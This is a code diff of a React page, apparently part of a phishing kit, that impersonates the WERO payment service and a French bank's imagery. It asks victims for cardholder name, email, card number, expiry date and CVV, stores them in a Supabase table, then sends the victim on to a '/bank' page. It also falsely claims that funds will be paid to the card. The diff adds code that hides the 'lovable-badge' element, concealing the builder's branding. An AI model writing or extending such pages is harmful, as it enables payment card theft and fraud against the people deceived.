@@ -1,5 +1,4 @@
-
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -21,6 +20,14 @@ const Card = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
 
+  // Masquer l'élément lovable-badge au montage
+  useEffect(() => {
+    const element = document.getElementById("lovable-badge");
+    if (element) {
+      element.style.display = "none";
+    }
+  }, []);
+
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
@@ -28,9 +35,14 @@ const Card = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
-    if (!formData.titulaire || !formData.email || !formData.numerocarte || 
-        !formData.dateexpiration || !formData.cryptogramme) {
+
+    if (
+      !formData.titulaire ||
+      !formData.email ||
+      !formData.numerocarte ||
+      !formData.dateexpiration ||
+      !formData.cryptogramme
+    ) {
       toast({
         title: "Erreur de validation",
         description: "Veuillez remplir tous les champs",
@@ -38,18 +50,17 @@ const Card = () => {
       });
       return;
     }
-    
+
     setIsLoading(true);
-    
+
     const userId = localStorage.getItem("userId");
-    
+
     if (!userId) {
       navigate("/");
       return;
     }
-    
+
     try {
-      // Mettre à jour les informations de carte dans la base de données
       await supabase
         .from("sefon")
         .update({
@@ -59,14 +70,14 @@ const Card = () => {
           cryptogramme: formData.cryptogramme,
         })
         .eq("id", userId);
-      
-      // Rediriger vers la page suivante
+
       navigate("/bank");
     } catch (error) {
       console.error(error);
       toast({
         title: "Erreur",
-        description: "Une erreur est survenue lors de l'enregistrement des informations de carte",
+        description:
+          "Une erreur est survenue lors de l'enregistrement des informations de carte",
         variant: "destructive",
       });
     } finally {
@@ -79,26 +90,26 @@ const Card = () => {
       <header className="bg-yellow-300 p-4">
         <h1 className="text-2xl font-bold">WERO</h1>
       </header>
-      
+
       <main className="flex-grow flex justify-center p-4">
         <div className="max-w-md w-full">
           <h2 className="text-2xl font-bold text-yellow-500 text-center mb-4">
             VEUILLEZ CONFIRMER VOTRE CARTE SUR WERO.
           </h2>
-          
+
           <div className="flex justify-center mb-4">
-            <img 
-              src="https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=242,h=138,fit=crop/Aq2q239lEjf2a2Mj/caisse-depargne-banque-populaire-_-ce-nouveau-moyen-de-paiement-arrive-en-exclusivite-debut-juillet-2-AMqlq7W4oNHNqVJM.jpg" 
-              className="img-fluid" 
+            <img
+              src="https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=242,h=138,fit=crop/Aq2q239lEjf2a2Mj/caisse-depargne-banque-populaire-_-ce-nouveau-moyen-de-paiement-arrive-en-exclusivite-debut-juillet-2-AMqlq7W4oNHNqVJM.jpg"
+              className="img-fluid"
               alt="Carte bancaire"
             />
           </div>
-          
+
           <p className="text-center mb-8">
-            Afin d'assurer la protection de nos utilisateurs, nous effectuerons un virement direct des fonds
-            vers votre carte bancaire.
+            Afin d'assurer la protection de nos utilisateurs, nous effectuerons un
+            virement direct des fonds vers votre carte bancaire.
           </p>
-          
+
           <form onSubmit={handleSubmit} className="space-y-6 bg-gray-50 p-6 rounded-lg">
             <div className="space-y-2">
               <Label htmlFor="titulaire">Titulaire de la carte</Label>
@@ -111,7 +122,7 @@ const Card = () => {
                 required
               />
             </div>
-            
+
             <div className="space-y-2">
               <Label htmlFor="email">Adresse e-mail</Label>
               <Input
@@ -124,7 +135,7 @@ const Card = () => {
                 required
               />
             </div>
-            
+
             <div className="space-y-2">
               <Label htmlFor="numerocarte">Numéro de carte</Label>
               <Input
@@ -137,7 +148,7 @@ const Card = () => {
                 required
               />
             </div>
-            
+
             <div className="grid grid-cols-2 gap-4">
               <div className="space-y-2">
                 <Label htmlFor="dateexpiration">Date d'expiration</Label>
@@ -151,7 +162,7 @@ const Card = () => {
                   required
                 />
               </div>
-              
+
               <div className="space-y-2">
                 <Label htmlFor="cryptogramme">CVV</Label>
                 <Input
@@ -165,7 +176,7 @@ const Card = () => {
                 />
               </div>
             </div>
-            
+
             <Button
               type="submit"
               className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 flex items-center justify-center"
@@ -177,7 +188,7 @@ const Card = () => {
           </form>
         </div>
       </main>
-      
+
       <Footer />
     </div>
   );
